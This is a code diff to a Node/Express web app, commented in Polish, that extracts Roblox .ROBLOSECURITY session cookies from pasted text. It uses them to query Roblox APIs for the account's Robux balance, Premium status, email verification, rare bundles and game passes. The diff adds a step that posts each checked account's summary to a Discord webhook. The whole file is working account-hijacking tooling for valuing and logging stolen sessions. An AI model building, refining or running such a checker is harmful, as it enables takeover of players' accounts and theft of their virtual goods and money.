@@ -5,7 +5,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ──────────────────────────────────────────────
-//  Strona główna – HTML + JS
+// Strona główna – HTML + JS
 // ──────────────────────────────────────────────
 app.get('/', (req, res) => {
   res.send(`
@@ -16,72 +16,28 @@ app.get('/', (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Cookie Extractor & Checker</title>
   <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #0f0f17;
-      color: #e0e0ff;
-      margin: 0;
-      padding: 20px;
-      line-height: 1.5;
-    }
+    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
     .container { max-width: 780px; margin: 0 auto; }
     h1 { color: #6ab0ff; text-align: center; }
-    textarea {
-      width: 100%;
-      min-height: 220px;
-      background: #1a1a2e;
-      color: #d0d0ff;
-      border: 1px solid #334;
-      border-radius: 8px;
-      padding: 14px;
-      font-family: Consolas, monospace;
-      font-size: 14px;
-      resize: vertical;
-      margin: 16px 0;
-    }
-    button {
-      background: #3b82f6;
-      color: white;
-      border: none;
-      padding: 14px 36px;
-      font-size: 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      display: block;
-      margin: 0 auto 24px;
-    }
+    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
+    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
     button:hover { background: #2563eb; }
-    #result {
-      background: #1a1a2e;
-      border: 1px solid #334;
-      border-radius: 8px;
-      padding: 20px;
-      min-height: 180px;
-      white-space: pre-wrap;
-      word-break: break-all;
-    }
-    .error   { color: #ff6b6b; font-weight: bold; }
+    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
+    .error { color: #ff6b6b; font-weight: bold; }
     .success { color: #4ade80; font-weight: bold; }
     .loading { color: #fbbf24; font-style: italic; }
-    img#avatar {
-      max-width: 160px;
-      border-radius: 10px;
-      border: 2px solid #334;
-      margin: 12px 0;
-      display: block;
-    }
+    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
   </style>
 </head>
 <body>
 <div class="container">
   <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-
-  <p>Wklej dowolny tekst zawierający cookie (logi, konsola, request headers, JSON itp.)<br>
-  Wartość zostanie automatycznie wyciągnięta, jeśli znajduje się pomiędzy <code>-and-items.|_</code> i <code>",</code></p>
+  <p>Wklej dowolny tekst zawierający cookie (logi, konsola, headers, JSON itp.)<br>
+  Wartość zostanie wyciągnięta automatycznie, jeśli jest pomiędzy <code>-and-items.|_</code> i <code>",</code></p>
 
   <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
 
-  <button onclick="check()">Sprawdź konto</button>
+  <button onclick="check()">Sprawdź i wyślij na webhook</button>
 
   <div id="result"></div>
 </div>
@@ -98,8 +54,8 @@ async function check() {
     return;
   }
 
-  // Wyciąganie cookie - dokładnie wg Twojego wzorca
-  const regex = /-and-items\.\|_(.*?)(?=",\s*)/s;
+  // Wyciąganie cookie dokładnie wg Twojego wzorca
+  const regex = /-and-items\\.|_(.+?)(?="\\s*,)/s;
   const match = raw.match(regex);
 
   let cookie = null;
@@ -108,11 +64,11 @@ async function check() {
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w podanym tekście</span>';
+    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
     return;
   }
 
-  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam konto...</span>';
+  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam i wysyłam na webhook...</span>';
 
   try {
     const res = await fetch('/check', {
@@ -130,11 +86,10 @@ async function check() {
       return;
     }
 
-    let html = \`<span class="success">Konto sprawdzone pomyślnie!</span><br><br>\`;
+    // Wyświetl wynik na stronie (opcjonalnie)
+    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
 
-    if (json.avatarUrl) {
-      html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
-    }
+    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
 
     html += \`
       <b>Username:</b> \${json.username || '?'}<br>
@@ -144,17 +99,15 @@ async function check() {
       <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
       <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
       <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
-      <b>MM2 passes:</b> \${json.mm2Count || 0}<br>
-      <b>AMP passes:</b> \${json.ampCount || 0}<br>
-      <b>SAB passes:</b> \${json.sabCount || 0}<br>
-      <b>Account age (days):</b> \${json.accountAgeDays || '?'}<br>
-      <b>Created:</b> \${json.created !== 'failed' ? new Date(json.created).toLocaleDateString('en-US') : '?'}
+      <b>MM2:</b> \${json.mm2Count || 0}<br>
+      <b>AMP:</b> \${json.ampCount || 0}<br>
+      <b>SAB:</b> \${json.sabCount || 0}<br>
     \`;
 
     result.innerHTML = html;
 
   } catch (err) {
-    result.innerHTML = \`<span class="error">Błąd podczas sprawdzania: \${err.message}</span>\`;
+    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
   }
 }
 </script>
@@ -164,7 +117,7 @@ async function check() {
 });
 
 // ──────────────────────────────────────────────
-// Endpoint /check – backend sprawdzający cookie
+// Endpoint /check – tutaj dzieje się magia + wysyłka na webhook
 // ──────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
@@ -173,137 +126,148 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // ─────── CSRF ───────
+    // CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'Content-Type': 'application/json'
-      }
+      },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to get CSRF token');
+    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // ─────── Dane użytkownika ───────
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'X-CSRF-TOKEN': csrfToken,
-        'Accept': 'application/json'
-      }
+        'Accept': 'application/json',
+      },
     });
     if (!userRes.ok) throw new Error('Invalid cookie');
-    const user = await userRes.json();
+    const userData = await userRes.json();
 
-    // ─────── Email verified (hat) ───────
+    // Email Verified (hat)
     let emailVerified = false;
     try {
-      const owns = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Asset/102611803`, {
+      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (owns.ok) {
-        const d = await owns.json();
-        emailVerified = !!d.data?.length;
+      if (ownsRes.ok) {
+        const ownsData = await ownsRes.json();
+        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
       }
     } catch {}
 
-    // ─────── Premium ───────
+    // Premium
     let hasPremium = false;
     try {
-      const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
+      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (prem.ok) hasPremium = await prem.json();
+      if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // ─────── Robux ───────
+    // Robux
     let robux = 0;
     try {
-      const cur = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
+      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (cur.ok) {
-        const d = await cur.json();
-        robux = d.robux || 0;
+      if (currencyRes.ok) {
+        const data = await currencyRes.json();
+        robux = data.robux || 0;
       }
     } catch {}
 
-    // ─────── Data utworzenia + wiek ───────
-    let created = null;
+    // Wiek konta + data utworzenia
     let accountAgeDays = 0;
+    let createdDate = null;
     try {
-      const prof = await fetch(`https://users.roblox.com/v1/users/${user.id}`);
-      if (prof.ok) {
-        const p = await prof.json();
-        if (p.created) {
-          created = p.created;
-          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
+      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
+      if (profileRes.ok) {
+        const profile = await profileRes.json();
+        if (profile.created) {
+          createdDate = profile.created;
+          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
         }
       }
     } catch {}
 
-    // ─────── Avatar ───────
+    // Avatar
     let avatarUrl = null;
     try {
-      const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=720x720&format=Png&isCircular=false`);
-      if (thumb.ok) {
-        const t = await thumb.json();
-        avatarUrl = t.data?.[0]?.imageUrl;
+      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
+      if (thumbRes.ok) {
+        const thumbData = await thumbRes.json();
+        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
       }
     } catch {}
 
-    // ─────── Gamepasses (przykładowe ID – możesz zmienić) ───────
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const all = [...mm2Ids, ...ampIds, ...sabIds];
+    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
+    const hasGamePasses = [];
 
-    let mm2Count = 0, ampCount = 0, sabCount = 0;
-
-    for (const id of all) {
-      try {
-        const r = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/GamePass/${id}`, {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-        });
-        if (r.ok) {
-          const d = await r.json();
-          if (d.data?.length) {
-            if (mm2Ids.includes(id)) mm2Count++;
-            if (ampIds.includes(id)) ampCount++;
-            if (sabIds.includes(id)) sabCount++;
+    try {
+      for (const passId of allIds) {
+        const gpRes = await fetch(
+          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
+          {
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${cookie}`,
+              'X-CSRF-TOKEN': csrfToken,
+              'Accept': 'application/json',
+            },
+          }
+        );
+        if (gpRes.ok) {
+          const gpData = await gpRes.json();
+          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
+            hasGamePasses.push(passId);
           }
         }
-      } catch {}
-    }
-
-    // ─────── Headless / Korblox (bundle) ───────
-    let hasHeadless = false, hasKorblox = false;
-    try {
-      const h = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Bundle/201`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (h.ok) {
-        const d = await h.json();
-        hasHeadless = !!d.data?.length;
-      }
-
-      const k = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Bundle/192`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (k.ok) {
-        const d = await k.json();
-        hasKorblox = !!d.data?.length;
       }
     } catch {}
 
-    res.json({
+    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
+    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
+    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
+
+    // Headless i Korblox (bundle ID jak wcześniej)
+    let hasHeadless = false;
+    let hasKorblox = false;
+    try {
+      const headlessRes = await fetch(
+        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
+        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
+      );
+      if (headlessRes.ok) {
+        const data = await headlessRes.json();
+        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
+      }
+
+      const korbloxRes = await fetch(
+        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
+        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
+      );
+      if (korbloxRes.ok) {
+        const data = await korbloxRes.json();
+        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
+      }
+    } catch {}
+
+    const result = {
       success: true,
-      username: user.name,
-      userId: user.id,
+      username: userData.name,
+      userId: userData.id,
       hasPremium,
       robux,
       accountAgeDays,
-      created: created || 'failed',
+      created: createdDate || 'failed',
       avatarUrl,
       emailVerified,
       hasHeadless,
@@ -311,11 +275,67 @@ app.post('/check', async (req, res) => {
       mm2Count,
       ampCount,
       sabCount
-    });
+    };
+
+    // ──────────────────────────────────────────────
+    // WYSYŁKA NA WEBHOOK DISCORD – tutaj dzieje się to, czego chcesz
+    // ──────────────────────────────────────────────
+    const webhookUrl = process.env.WEBHOOK; // dodaj zmienną środowiskową w Railway
+    if (webhookUrl) {
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            embeds: [{
+              color: 0x0F0F23,
+              title: `<:User:1481761037257674872> ${userData.name}`,
+              description: "**AVATAR**",
+              thumbnail: {
+                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+              },
+              fields: [
+                {
+                  name: "**Info**",
+                  value:
+                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
+                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
+                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
+                  inline: true
+                },
+                {
+                  name: "**Games**",
+                  value:
+                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
+                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
+                    `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
+                  inline: true
+                },
+                {
+                  name: "**Inventory**",
+                  value:
+                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
+                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
+                  inline: true
+                }
+              ],
+              footer: {
+                text: "24H! • " + new Date().toLocaleString('en-US')
+              },
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      } catch (e) {
+        console.error("Błąd wysyłki webhook:", e.message);
+      }
+    }
+
+    res.json(result);
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Internal error' });
+    res.status(500).json({ error: err.message || 'Internal server error' });
   }
 });
 
